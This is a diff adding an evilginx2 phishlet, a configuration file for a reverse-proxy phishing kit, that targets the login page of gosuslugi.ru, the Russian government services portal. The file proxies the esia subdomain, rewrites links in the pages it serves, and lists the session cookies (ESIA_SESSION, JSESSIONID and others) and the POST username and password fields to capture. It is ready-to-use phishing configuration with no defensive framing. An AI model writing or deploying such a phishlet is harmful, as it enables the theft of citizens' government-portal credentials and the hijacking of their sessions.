@@ -1,0 +1,35 @@
+#https://github.com/kgretzky/evilginx2/wiki/Phishlet-File-Format-(2.2.0)
+
+name: 'gosuslugi'
+
+autor: '@kirrrkaz'
+min_ver: '2.2.0'
+
+proxy_hosts:
+  - {phish_sub: 'esia', orig_sub: 'esia', domain: 'gosuslugi.ru', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'esia.gosuslugi.ru', orig_sub: 'esia', domain: 'gosuslugi.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'esia.gosuslugi.ru', orig_sub: 'esia', domain: 'gosuslugi.ru', search: 'https://{hostname}/login/', replace: 'https://{hostname}/login/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'esia.gosuslugi.ru', orig_sub: 'esia', domain: 'gosuslugi.ru', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'esia.gosuslugi.ru', orig_sub: 'esia', domain: 'gosuslugi.ru', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'esia.gosuslugi.ru', orig_sub: 'esia', domain: 'gosuslugi.ru', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+
+auth_tokens:
+  - domain: '.gosuslugi.ru'
+    keys: ['ESIA_SESSION','JSESSIONID','JSESSIONID','cox_id', 'srv_id']
+
+credentials:
+  username:
+    key: 'session\[username_or_email\]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'session\[password\]'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'gosuslugi.ru'
+  path: '/login'
+    
